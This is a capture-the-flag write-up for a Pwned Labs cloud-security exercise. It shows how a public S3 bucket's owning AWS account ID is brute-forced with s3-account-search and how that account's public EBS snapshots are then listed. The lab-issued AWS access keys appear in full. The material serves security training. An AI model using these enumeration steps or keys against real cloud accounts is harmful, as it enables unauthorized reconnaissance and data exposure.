# Identify AWS Account ID from Public S3 Bucket - CTF Report (Kakaxh1)

---
Target IP: 54.204.171.32

Platform: Pwned Labs

Machine: Identify AWS Account ID from a Public S3 Bucket

Date: June 2026
---

## Initial Reconnaissance

### Step 1: Initial Access

The lab provided:
- IP Address: 54.204.171.32
- Access Key ID: AKIAWHEOTHRFSKZI3H42
- Secret Access Key: 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

### Step 2: Nmap Scan

I performed an Nmap scan on the provided IP address to understand what services were running:

```bash
nmap -sV -p- 54.204.171.32
```

**Findings from Nmap Scan**:

```
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.54 ((Ubuntu))
```

The server was only running HTTP on port 80.

### Step 3: Web Server Investigation

Visiting http://54.204.171.32/ revealed a web page. The source code or page content contained clues about the S3 bucket.

i go to the page:

```bash
http://54.204.171.32/
```
<img width="639" height="402" alt="Screenshot 2026-06-22 004218" src="https://github.com/user-attachments/assets/257b17f9-60c2-4b2d-aba6-74ac4d602568" />


The page contained references to an S3 bucket. Specifically, images were being loaded from:

```
https://mega-big-tech.s3.amazonaws.com/images/watchpro5.jpg
```

<img width="640" height="400" alt="Screenshot 2026-06-22 004305" src="https://github.com/user-attachments/assets/6944e964-779e-453c-a93a-d6e2059c6025" />


This revealed the S3 bucket name: **mega-big-tech**

---

## S3 Bucket Enumeration

### Step 4: Explore the S3 Bucket

Since the bucket appeared to be public, I accessed the bucket listing:

```bash
curl -s https://mega-big-tech.s3.amazonaws.com/
```
<img width="632" height="272" alt="Screenshot 2026-06-22 014017" src="https://github.com/user-attachments/assets/351473a5-27bc-4835-84da-bad5f6041c8c" />


<img width="638" height="399" alt="Screenshot 2026-06-22 014047" src="https://github.com/user-attachments/assets/7da31804-68f1-4e78-a173-bff2e72b1675" />





Or with AWS CLI:

```bash
aws s3 ls s3://mega-big-tech/ --no-sign-request
```

<img width="278" height="241" alt="image" src="https://github.com/user-attachments/assets/d17fd090-f41f-469b-af65-5422e866ea9f" />


This confirmed the bucket was publicly accessible and contained only image files.

---

## AWS Credentials Configuration

### Step 5: Configure AWS CLI

The lab provided AWS credentials:

```bash
aws configure
```

```
AWS Access Key ID [None]: AKIAWHEOTHRFSKZI3H42
AWS Secret Access Key [None]: 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
Default region name [None]: us-east-1
Default output format [None]: 
```
<img width="503" height="143" alt="Screenshot 2026-06-22 004849" src="https://github.com/user-attachments/assets/758d4c4e-f80c-4f37-bc77-8abcbd9562eb" />


### Step 6: Verify Credentials

```bash
aws sts get-caller-identity
```

Output:
```json
{
    "UserId": "AIDAWHEOTHRF62U7I6AWZ",
    "Account": "427648302155",
    "Arn": "arn:aws:iam::427648302155:user/s3user"
}
```

This confirmed:
- Credentials were valid
- Our account ID: 427648302155
- IAM username: s3user

---

## Account ID Discovery

### Step 7: Install s3-account-search Tool

On Kali Linux, Python package installation is managed through pipx:

```bash
# Install pipx
sudo apt install -y pipx

# Install s3-account-search
pipx install s3-account-search

# Add to PATH
pipx ensurepath
source ~/.bashrc
```

### Step 8: Run Account ID Brute Force

The s3-account-search tool requires a role ARN. The lab provided:

```
arn:aws:iam::427648302155:role/LeakyBucket
```

Run the tool:

```bash
s3-account-search arn:aws:iam::427648302155:role/LeakyBucket mega-big-tech
```

Output:

```
Starting search (this can take a while)
found: 1
found: 10
found: 107
found: 1075
found: 10751
found: 107513
found: 1075135
found: 10751350
found: 107513503
found: 1075135037
found: 10751350379
found: 107513503799
```

<img width="559" height="221" alt="image" src="https://github.com/user-attachments/assets/cdfe0321-2dd9-45ba-a49a-af3444082d7f" />


**Target Account ID**: 107513503799

---

## Discovery of Exposed Resources

### Step 9: Find the Bucket Region

```bash
curl -I https://mega-big-tech.s3.amazonaws.com
```

Response header:
```
x-amz-bucket-region: us-east-1
```

<img width="809" height="182" alt="Screenshot 2026-06-22 013429" src="https://github.com/user-attachments/assets/554db846-5057-4144-9ff5-e8aafccf66f6" />


The bucket is hosted in us-east-1 (North Virginia).

### Step 10: Search for Public EBS Snapshots

Now that we have the account ID, we can search for other publicly exposed resources in the same region:

```bash
aws ec2 describe-snapshots --owner-ids 107513503799 --region us-east-1
```

Output:
```json
[
    {
        "StorageTier": "standard",
        "SnapshotId": "snap-08580043db7a923f6",
        "VolumeId": "vol-04462a3562c7e6a15",
        "State": "completed",
        "StartTime": "2023-06-25T23:08:45.155000+00:00",
        "OwnerId": "107513503799",
        "Description": "Created by CreateImage(i-089b146125db92ee4) for ami-0676627ee43624fb2",
        "VolumeSize": 8,
        "Encrypted": false
    }
]
```

<img width="733" height="293" alt="Screenshot 2026-06-22 011836" src="https://github.com/user-attachments/assets/52a79cfa-c05a-4557-84a3-a3d4a177bd42" />

The snapshot is public and unencrypted. Anyone can create a volume from it and access the data.


---

## Summary

| Finding | Value |
|---------|-------|
| Target S3 Bucket | mega-big-tech |
| Our Account ID | 427648302155 |
| Target Account ID | 107513503799 |
| Bucket Region | us-east-1 |
| Public EBS Snapshot | snap-08580043db7a923f6 |
| Snapshot Size | 8 GB |

---

## Author Information

**Author**: Kakaxh1  
**GitHub**: https://github.com/Kakaxh1/  
**Date**: December 2025  
**Platform**: Pwned Labs - Identify AWS Account ID from a Public S3 Bucket

---

Lab Complete. Flag: 107513503799
